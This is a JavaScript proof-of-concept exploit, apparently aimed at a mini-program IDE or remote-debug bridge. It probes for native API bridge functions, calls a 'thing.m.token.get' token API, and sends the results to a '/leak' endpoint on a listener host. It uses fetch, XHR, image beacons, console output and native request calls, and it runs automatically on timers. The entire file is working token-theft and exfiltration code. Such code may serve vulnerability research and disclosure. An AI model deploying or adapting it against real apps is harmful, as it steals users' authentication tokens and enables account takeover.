(function () {
  var HTTP_BASE = "http://127.0.0.1:8000";
  var ATOP_API = "thing.m.token.get";
  var ATOP_VERSION = "1.0";
  var ATOP_POST_DATA = {};
  var POC_TAG = "ideRemote2-token-poc";
  var sent = {};
  var nativeLeakSent = {};

  function safeJson(value) {
    try {
      return JSON.parse(JSON.stringify(value));
    } catch (e) {
      try {
        return String(value);
      } catch (_) {
        return "[unserializable]";
      }
    }
  }

  function emit(event, payload) {
    var body = {
      tag: POC_TAG,
      event: event,
      href: (typeof location !== "undefined" && location.href) ? location.href : "",
      ts: Date.now(),
      payload: safeJson(payload)
    };
    var text = "";
    try {
      text = JSON.stringify(body);
    } catch (e) {
      text = '{"tag":"ideRemote2-token-poc","event":"json_error"}';
    }
    try {
      if (typeof postEventToIde === "function") {
        postEventToIde(text);
      }
    } catch (e1) {}
    try {
      if (typeof nativeJSBridge !== "undefined" && nativeJSBridge && typeof nativeJSBridge.postEventToIde === "function") {
        nativeJSBridge.postEventToIde(text);
      }
    } catch (e2) {}
    try {
      console.log("__IDE_REMOTE2_POC__" + text);
    } catch (e3) {}
    try {
      if (typeof fetch === "function") {
        fetch(HTTP_BASE + "/leak", {
          method: "POST",
          mode: "no-cors",
          headers: {"Content-Type": "text/plain"},
          body: text
        }).catch(function () {});
      }
    } catch (e4) {}
    try {
      if (typeof XMLHttpRequest === "function") {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", HTTP_BASE + "/leak", true);
        xhr.setRequestHeader("Content-Type", "text/plain");
        xhr.send(text);
      }
    } catch (e5) {}
    try {
      if (typeof Image !== "undefined") {
        var img = new Image();
        img.src = HTTP_BASE + "/leak?d=" + encodeURIComponent(text);
      }
    } catch (e6) {}
    try {
      nativeLeak(text);
    } catch (e7) {}
  }

  function addCandidate(list, seen, name, owner, fn) {
    if (typeof fn !== "function") {
      return;
    }
    if (seen[name]) {
      return;
    }
    seen[name] = true;
    list.push({name: name, owner: owner, fn: fn});
  }

  function collectRequestCandidates() {
    var list = [];
    var seen = {};
    try {
      if (typeof ty !== "undefined" && ty) {
        addCandidate(list, seen, "ty.request", ty, ty.request);
        if (ty.TUNINetworkManager) {
          addCandidate(list, seen, "ty.TUNINetworkManager.request", ty.TUNINetworkManager, ty.TUNINetworkManager.request);
        }
        if (ty.network) {
          addCandidate(list, seen, "ty.network.request", ty.network, ty.network.request);
        }
      }
    } catch (e1) {}
    try {
      if (typeof getNativeKits === "function") {
        var kits = getNativeKits();
        if (kits && typeof kits === "object") {
          Object.keys(kits).forEach(function (key) {
            var mod = kits[key];
            if (!mod) {
              return;
            }
            addCandidate(list, seen, "nativeKits." + key + ".request", mod, mod.request);
            if (mod.TUNINetworkManager) {
              addCandidate(list, seen, "nativeKits." + key + ".TUNINetworkManager.request", mod.TUNINetworkManager, mod.TUNINetworkManager.request);
            }
          });
        }
      }
    } catch (e2) {}
    return list;
  }

  function nativeLeak(text) {
    var req = {
      taskId: "ideRemote2-leak-" + Date.now() + "-" + Math.floor(Math.random() * 100000),
      url: HTTP_BASE + "/leak",
      method: "POST",
      data: text,
      dataType: "text/plain",
      responseType: "text",
      timeout: 5000,
      header: {"Content-Type": "text/plain"},
      success: function () {},
      fail: function () {},
      complete: function () {}
    };
    collectRequestCandidates().forEach(function (candidate) {
      var key = candidate.name + ":" + text.slice(0, 128);
      if (nativeLeakSent[key]) {
        return;
      }
      nativeLeakSent[key] = true;
      try {
        candidate.fn.call(candidate.owner, req);
      } catch (e) {}
    });
  }

  function collectApiCandidates() {
    var list = [];
    var seen = {};
    try {
      if (typeof ty !== "undefined" && ty) {
        addCandidate(list, seen, "ty.apiRequestByAtop", ty, ty.apiRequestByAtop);
        if (ty.TUNIAPIRequestManager) {
          addCandidate(list, seen, "ty.TUNIAPIRequestManager.apiRequestByAtop", ty.TUNIAPIRequestManager, ty.TUNIAPIRequestManager.apiRequestByAtop);
        }
        if (ty.api && ty.api.apiRequestByAtop) {
          addCandidate(list, seen, "ty.api.apiRequestByAtop", ty.api, ty.api.apiRequestByAtop);
        }
      }
    } catch (e1) {}
    try {
      if (typeof getNativeKits === "function") {
        var kits = getNativeKits();
        if (kits && typeof kits === "object") {
          Object.keys(kits).forEach(function (key) {
            var mod = kits[key];
            if (!mod) {
              return;
            }
            addCandidate(list, seen, "nativeKits." + key + ".apiRequestByAtop", mod, mod.apiRequestByAtop);
            if (mod.TUNIAPIRequestManager) {
              addCandidate(list, seen, "nativeKits." + key + ".TUNIAPIRequestManager.apiRequestByAtop", mod.TUNIAPIRequestManager, mod.TUNIAPIRequestManager.apiRequestByAtop);
            }
          });
        }
      }
    } catch (e2) {}
    return list;
  }

  function buildAtopOptions(source) {
    return {
      api: ATOP_API,
      version: ATOP_VERSION,
      postData: ATOP_POST_DATA,
      extData: {},
      requestId: "ideRemote2-poc-" + Date.now() + "-" + Math.floor(Math.random() * 100000),
      success: function (res) {
        emit("token_success", {source: source, response: res});
      },
      fail: function (err) {
        emit("token_fail", {source: source, error: err});
      },
      complete: function (res) {
        emit("token_complete", {source: source, response: res});
      }
    };
  }

  function tryInvoke(candidate) {
    var key = candidate.name + ":" + ATOP_API;
    if (sent[key]) {
      return;
    }
    sent[key] = true;
    var options = buildAtopOptions(candidate.name);
    emit("token_call_attempt", {source: candidate.name, api: ATOP_API, version: ATOP_VERSION});
    try {
      var ret = candidate.fn.call(candidate.owner, options);
      if (ret && typeof ret.then === "function") {
        ret.then(function (res) {
          emit("token_promise_resolve", {source: candidate.name, response: res});
        }).catch(function (err) {
          emit("token_promise_reject", {source: candidate.name, error: err});
        });
      } else if (ret !== undefined) {
        emit("token_sync_return", {source: candidate.name, response: ret});
      }
    } catch (e) {
      emit("token_throw", {source: candidate.name, error: String(e && e.stack ? e.stack : e)});
    }
  }

  function run() {
    var candidates = collectApiCandidates();
    emit("api_candidates", {count: candidates.length, names: candidates.map(function (c) { return c.name; })});
    if (!candidates.length) {
      return;
    }
    candidates.forEach(tryInvoke);
  }

  try {
    if (typeof globalThis !== "undefined") {
      globalThis.__ideRemote2TokenPocRun = run;
    }
  } catch (e) {}

  setTimeout(run, 500);
  setTimeout(run, 2000);
  setTimeout(run, 5000);
})();